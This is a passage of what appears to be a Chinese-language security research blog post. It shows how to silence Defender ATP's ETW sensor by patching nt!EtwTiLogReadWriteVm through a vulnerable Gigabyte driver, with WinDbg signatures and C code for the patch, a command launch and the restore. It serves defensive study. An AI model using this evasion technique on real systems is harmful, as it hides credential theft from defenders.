    fffff801`25bc7b9c 8954c448        mov     dword ptr [rsp+rax*8+48h],edx
    fffff801`25bc7ba0 488d442440      lea     rax,[rsp+40h]
    fffff801`25bc7ba5 488bd3          mov     rdx,rbx
    fffff801`25bc7ba8 4889442420      mov     qword ptr [rsp+20h],rax
    fffff801`25bc7bad e8ce0e8aff      call    nt!EtwWrite (fffff801`25468a80)
    fffff801`25bc7bb2 90              nop
    fffff801`25bc7bb3 e939a9e8ff      jmp     nt!EtwTiLogReadWriteVm+0x71 (fffff801`25a524f1)  Branch
## 0x03 修改内核
现在我们已经知道系统对内存读取操作的告警点，那么能不能找到办法，避免ATP通过Etw检测到Dumpert的执行呢？比如，如果我们能patch内核，在`nt!
EtwTiLogReadWriteVm`函数开头处插入一个`RET`，那么就能绕过任何记录行为。在内核patch方面，我们只需要能够在Ring3写入内核内存空间即可。在开发PoC时，我们最初想自己开发一个可用的驱动。然后我突然想起跟Cn33liz的一次讨论，当时小伙伴提示我们可以通过存在漏洞的驱动在Ring0执行代码。根据[Cn33liz](https://twitter.com/Cneelis)的提示，我们可以选择Gigabyte的漏洞驱动来实现本地提权，这方面内容大家可以参考这篇文章，其中详细分析了如何提权，以及如何移除进程保护模式（Process Protect
Mode）。一旦我们具备内核模式的读写权限，我们还需要寻找特征点。在Windows 10 1909上，我们可以寻找如下特征：
    fffff804`0e45291c 4183f910        cmp     r9d,10h
    fffff804`0e452920 b800000c00      mov     eax,0C0000h
    fffff804`0e452925 41b800000300    mov     r8d,30000h
然后使用windbg，检查该特征是否具备唯一性：
    lkd> s -[1]b nt L0x1000000 41 83 f9 10 b8 00 00 0c 00 41 b8 00 00 03 00
    0xfffff804`0e45291c
然后计算偏移量：
    lkd> ? fffff804`0e45291c - nt!EtwTiLogReadWriteVm
    Evaluate expression: 76 = 00000000`0000004c
为了获取内核的基址，我们可以使用`NtQuerySystemInformation`，将`NtQuerySystemInformation`传入`SystemInformationClass`参数。
    cif (!NT_SUCCESS(status = NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, 1024 * 1024, NULL)))
    {
      printf("\nError: Unable to query module list (%#x)\n", status);
      VirtualFree(ModuleInfo, 0, MEM_RELEASE);
      return -1;
    }
然后遍历已加载的模块，寻找`ntoskrnl.exe`，将patch应用到前面windbg计算出的偏移量：
    for (i = 0; i NumberOfModules; i++)
    {
        if (strcmp((char *)(ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName), "ntoskrnl.exe") == 0)
        {
        printf("[+] Kernel address: %#x\n", ModuleInfo->Modules[i].ImageBase);
        uintptr_t pml4 = find_directory_base(ghDriver);
        printf("\n");
        BOOL result = read_virtual_memory(ghDriver, pml4, (uintptr_t)ModuleInfo->Modules[i].ImageBase, buffer, searchlen);
        if(result)
        {
            DWORD offset = searchSign((unsigned char*)buffer, signature, sizeof(signature));
            free(buffer);
            printf("[*] Offset %d\n", offset - backoffset);
            patchFunction(ModuleInfo->Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm");
            printf("[+] Run your command now\n");
            int retCode = system(argv[1]);
            printf("\n\n");
                printf("[+] Execution finished with exit code: %d\n", retCode);
        }
        else
        {
            printf("[*] Errore reading kernel memory \n");
        }
        }
    }
当我们第一次执行PoC时，我们以为能看到成功结果，或者遇到BSOD，然而结果却比较尴尬。我们的工具成功patch，并且执行Dumpert也没有触发警报，然而在几分钟后，目标主机开始重启。通过事件查看器，我们发现了Kernel
Patch Protection（内核补丁保护，KPP）的身影（EventData 0x00000109）。
KPP会定期执行检查，确保内核中受保护的系统结构没被篡改。如果检测到不一致，那么将出现蓝屏以及/或者重新启动。
我们的目标并非绕过KPP，但至少要限制BSOD出现的几率。经测试后，我们发现每隔5到10分钟，KPP的检测机制就会发现我们的patch操作，我们的执行时间只有几秒钟。因此我们改进了思路，只有在必要的时候再patch内核，执行完毕后再恢复初始状态。大家可以参考[此处](https://gist.github.com/b4rtik/daefa2b3d9c99d825e354f4d32ec9927)的部分源代码。
    for (i = 0; i NumberOfModules; i++)
    {
        if (strcmp((char *)(ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName), "ntoskrnl.exe") == 0)
        {
        printf("[+] Kernel address: %#x\n", ModuleInfo->Modules[i].ImageBase);
        uintptr_t pml4 = find_directory_base(ghDriver);
        printf("\n");
        BOOL result = read_virtual_memory(ghDriver, pml4, (uintptr_t)ModuleInfo->Modules[i].ImageBase, buffer, searchlen);
        if(result)
        {
            DWORD offset = searchSign((unsigned char*)buffer, signature, sizeof(signature));
            free(buffer);
            printf("[*] Offset %d\n", offset - backoffset);
            BYTE EtwTiLogReadWriteVmOri = patchFunction(ModuleInfo->Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm");
            printf("[+] Run your command now\n");
            int retCode = system(argv[1]);
            printf("\n\n");
                printf("[+] Execution finished with exit code: %d\n", retCode);
            printf("[+] Proceed to restore previous state.\n");
            patchFunction(ModuleInfo->Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm", EtwTiLogReadWriteVmOri);
        }
        else
        {
            printf("[*] Errore reading kernel memory \n");
        }
        }
    }
## 0x04 总结
根据我们的观察，系统不能及时捕捉到我们的修改操作，我们可以通过单字节patch实现绕过效果。MDATP的检测机制远不止这个传感器，而我们通过较为粗暴的方式直接禁用掉其跟踪机制。我们比较好奇的是，为什么存在漏洞的这个驱动依然可以在操作系统中使用。